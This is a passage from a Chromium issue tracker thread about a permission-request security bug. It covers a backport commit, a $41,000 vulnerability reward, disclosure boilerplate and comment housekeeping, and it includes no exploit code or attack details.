### vo...@google.com (2023-02-22)

1. Just one https://crrev.com/c/4280123
2. No conflicts
3. 109, 110, 111
4. Yes

### ha...@gmail.com (2023-02-22)

[Comment Deleted]

### pg...@google.com (2023-02-22)

[Empty comment from Monorail migration]

### gm...@google.com (2023-02-23)

[Empty comment from Monorail migration]

### gm...@google.com (2023-02-23)

[Empty comment from Monorail migration]

### gm...@google.com (2023-02-27)

[Empty comment from Monorail migration]

### gi...@appspot.gserviceaccount.com (2023-02-28)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/d1326e943a52126dd158a17ef7e8839c035f6e7b

commit d1326e943a52126dd158a17ef7e8839c035f6e7b
Author: Thomas Nguyen <tungnh@google.com>
Date: Tue Feb 28 12:53:12 2023

[M108-LTS] Skip finalizing permission requests in pending queue

Bug: 1415366

(cherry picked from commit dd597022c93047e88f6ddb812eb04ed392222b33)

(cherry picked from commit 2bd849cc947cff0607666fd9225f0f552f3c6f8b)

Change-Id: I2bd464a202354d9941bed8498bd44b5c5ebea6de
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4271191
Commit-Queue: Thomas Nguyen <tungnh@chromium.org>
Cr-Original-Original-Commit-Position: refs/heads/main@{#1107426}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4277341
Commit-Queue: Srinivas Sista <srinivassista@chromium.org>
Owners-Override: Srinivas Sista <srinivassista@chromium.org>
Cr-Original-Commit-Position: refs/branch-heads/5414@{#1524}
Cr-Original-Branched-From: 4417ee59d7bf6df7a9c9ea28f7722d2ee6203413-refs/heads/main@{#1070088}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4280123
Reviewed-by: Thomas Nguyen <tungnh@chromium.org>
Reviewed-by: Balazs Engedy <engedy@chromium.org>
Reviewed-by: Victor-Gabriel Savu <vsavu@google.com>
Commit-Queue: Zakhar Voit <voit@google.com>
Cr-Commit-Position: refs/branch-heads/5359@{#1395}
Cr-Branched-From: 27d3765d341b09369006d030f83f582a29eb57ae-refs/heads/main@{#1058933}

[modify] https://crrev.com/d1326e943a52126dd158a17ef7e8839c035f6e7b/components/permissions/permission_request_manager.cc
[modify] https://crrev.com/d1326e943a52126dd158a17ef7e8839c035f6e7b/components/permissions/permission_request_manager.h


### vo...@google.com (2023-02-28)

[Empty comment from Monorail migration]

### am...@google.com (2023-03-02)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2023-03-02)

Congratulations, Mickey! The VRP panel has decided to award you $41,000 for this report for the browser process memory corruption + renderer RCE bonus since this issue did not require a compromised renderer + bisect bonus. Thank you for your efforts in discovering this issue and updating us with new information and demonstration of higher impact -- excellent work! 

### ha...@gmail.com (2023-03-03)

Thanks!

### am...@google.com (2023-03-03)

[Empty comment from Monorail migration]

### [Deleted User] (2023-05-29)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### am...@chromium.org (2023-07-06)

Hello, we consider attachments/POCs and all analysis included with reports to be an integral part of the report (https://g.co/chrome/vrp/#investigating-and-reporting-bugs), even when included in comments, so I have undeleted all comments with this information. Please refrain from deleting comments with this type of data. Thank you! 

### 18...@gmail.com (2023-11-16)

[Comment Deleted]

### ha...@gmail.com (2023-11-17)

Hello,  the reproduce step in https://crbug.com/chromium/1415366#c31 don't need race.

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1415366?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40063055)*
